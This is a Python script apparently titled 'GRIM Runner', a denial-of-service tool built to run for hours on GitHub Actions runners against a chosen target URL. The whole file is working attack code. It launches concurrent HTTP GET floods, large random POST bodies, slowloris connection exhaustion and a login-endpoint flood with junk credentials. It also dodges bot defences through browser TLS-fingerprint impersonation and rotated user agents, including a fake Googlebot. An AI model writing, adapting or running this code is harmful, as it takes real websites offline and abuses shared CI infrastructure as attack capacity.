#!/usr/bin/env python3
"""
GRIM Runner — GitHub Actions Edition
Runs GRIM with all 4 vectors on a single runner.
Gets TARGET + WORKERS from environment.
"""
import os
import sys
import asyncio
import time
import random
import ssl
import os
from urllib.parse import urlparse

# Install curl_cffi if missing
try:
    import curl_cffi
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "curl_cffi", "-q"])
    import curl_cffi

# ─── CONFIG ────────────────────────────────────────────────────────────────────

VERSION = "1.0-GRIM"
TIMEOUT = 8

TARGET = os.environ.get("TARGET", "https://target.example.com")
WORKERS = int(os.environ.get("WORKERS", "50"))
DURATION = int(os.environ.get("DURATION", "14400"))  # 4h default for GH Actions
SLOT = os.environ.get("SLOT", "1")

UA_STRINGS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://www.facebook.com/",
    "https://twitter.com/home",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
]

TLS_FPS = ["chrome120", "chrome119", "chrome116", "edge101", "safari184"]

CF_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
}

# ─── STATS ────────────────────────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self.sent = 0
        self.ok = 0
        self.errors = 0
        self.challenges = 0
        self.start = time.time()
        self._lock = asyncio.Lock()

    async def inc(self, key='sent'):
        async with self._lock:
            setattr(self, key, getattr(self, key) + 1)

    def report(self):
        elapsed = max(1, time.time() - self.start)
        rps = int(self.sent / elapsed)
        return (f"[{int(elapsed)}s] S:{self.sent} OK:{self.ok} "
                f"E:{self.errors} C:{self.challenges} RPS:{rps}")

STATS = Stats()
STOP = False

# ─── VECTORS ──────────────────────────────────────────────────────────────────

async def h2_flood(url, workers):
    parsed = urlparse(url)
    host = parsed.netloc

    def _sync_get():
        s = curl_cffi.requests.Session(impersonate=random.choice(TLS_FPS))
        return s.get(
            url, timeout=TIMEOUT,
            headers={
                **CF_HEADERS, "Host": host,
                "User-Agent": random.choice(UA_STRINGS),
                "Referer": random.choice(REFERERS) + host,
            },
            allow_redirects=False,
        )

    async def worker():
        while not STOP:
            try:
                r = await asyncio.to_thread(_sync_get)
                await STATS.inc('sent')
                sc = r.status_code
                if sc in (200, 302, 400, 401, 403, 404, 429, 500, 502, 503):
                    await STATS.inc('ok')
                elif sc in (403, 429, 503):
                    await STATS.inc('challenges')
                else:
                    await STATS.inc('errors')
            except Exception:
                await STATS.inc('errors')

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks)


async def post_bomb(url, workers):
    parsed = urlparse(url)
    host = parsed.netloc
    body = os.urandom(1024 * 256)

    def _sync_post():
        s = curl_cffi.requests.Session(impersonate=random.choice(TLS_FPS))
        return s.post(
            url, data=body, timeout=TIMEOUT,
            headers={
                **CF_HEADERS, "Host": host,
                "User-Agent": random.choice(UA_STRINGS),
                "Content-Type": "application/octet-stream",
                "Referer": random.choice(REFERERS) + host,
            }
        )

    async def worker():
        while not STOP:
            try:
                r = await asyncio.to_thread(_sync_post)
                await STATS.inc('sent')
                if r.status_code in (200, 302, 400, 403, 404, 429, 500, 502, 503):
                    await STATS.inc('ok')
                else:
                    await STATS.inc('errors')
            except Exception:
                await STATS.inc('errors')

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks)


async def slowloris(url, workers):
    import socket
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    port = parsed.port or 443
    use_tls = parsed.scheme == "https"

    async def worker():
        while not STOP:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)
                if use_tls:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.connect((host, port))
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(UA_STRINGS)}\r\n"
                    f"Accept: */*\r\n"
                )
                sock.send(req.encode())
                for _ in range(120):
                    if STOP:
                        break
                    try:
                        sock.send(b"X-a: b\r\n")
                        await asyncio.sleep(0.5)
                    except:
                        break
                sock.close()
                await STATS.inc('sent')
                await STATS.inc('ok')
            except Exception:
                await STATS.inc('errors')

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks)


async def auth_grind(url, workers):
    parsed = urlparse(url)
    host = parsed.netloc
    base = f"{parsed.scheme}://{host}"
    login_url = f"{base}/login"

    def _sync_auth():
        s = curl_cffi.requests.Session(impersonate=random.choice(TLS_FPS))
        try:
            s.get(login_url, timeout=5)
        except:
            pass
        return s.post(
            login_url,
            data={
                "username": f"grim_{random.randint(100000, 999999)}",
                "password": "grim_junk_pass_123",
                "__RequestVerificationToken": "grim_junk_token",
            },
            timeout=TIMEOUT,
            headers={
                "Host": host,
                "User-Agent": random.choice(UA_STRINGS),
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": login_url,
            }
        )

    async def worker():
        while not STOP:
            try:
                r = await asyncio.to_thread(_sync_auth)
                await STATS.inc('sent')
                if r.status_code in (200, 302, 400, 401, 403, 404):
                    await STATS.inc('ok')
                elif r.status_code in (429, 503):
                    await STATS.inc('challenges')
                else:
                    await STATS.inc('errors')
            except Exception:
                await STATS.inc('errors')

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks)


# ─── MAIN ─────────────────────────────────────────────────────────────────────

async def run_siege():
    print(f"  ═══ GRIM Runner #{SLOT} ═══")
    print(f"  Target: {TARGET}")
    print(f"  Workers: {WORKERS}/vector")
    print(f"  Duration: {DURATION}s")
    print(f"  Vectors: h2(post+get), slowloris, auth-grind")
    print()

    vectors = [
        asyncio.create_task(h2_flood(TARGET, WORKERS)),
        asyncio.create_task(post_bomb(TARGET, WORKERS)),
        asyncio.create_task(slowloris(TARGET, WORKERS)),
        asyncio.create_task(auth_grind(TARGET, WORKERS)),
    ]

    async def reporter():
        while not STOP:
            await asyncio.sleep(5)
            if STOP:
                break
            print(f"  [GRIM-#{SLOT}] {STATS.report()}")

    rep = asyncio.create_task(reporter())

    try:
        await asyncio.wait_for(asyncio.gather(*vectors), timeout=DURATION)
    except asyncio.TimeoutError:
        pass
    except Exception as e:
        print(f"  Error: {e}")

    global STOP
    STOP = True
    rep.cancel()
    print(f"\n  [GRIM-#{SLOT}] FINAL: {STATS.report()}")


def main():
    print()
    print(f"  ╔══════════════════════════════════════╗")
    print(f"  ║  GRIM v{VERSION} — SIEGE MODE         ║")
    print(f"  ║  Runner #{SLOT} | Azure CPU          ║")
    print(f"  ╚══════════════════════════════════════╝")
    print()
    asyncio.run(run_siege())


if __name__ == "__main__":
    main()
